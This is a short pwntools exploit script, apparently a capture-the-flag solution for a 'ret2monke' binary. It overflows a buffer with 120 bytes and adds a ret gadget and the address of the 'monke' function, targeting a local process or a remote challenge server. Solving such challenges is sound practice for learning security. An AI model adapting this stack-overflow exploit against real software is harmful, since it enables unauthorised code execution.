#!/usr/bin/env python3

from pwn import *

EXE = ELF("./ret2monke")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("165.227.103.166", 6001)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

monke_addr = EXE.sym["monke"]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 120 + p64(ret) + p64(monke_addr)

r.recvuntil(
    b"in today's society, is there not joy to be found in the simpler things?\n"
)
r.sendline(payload)
data = r.recvall()
print(data.decode())
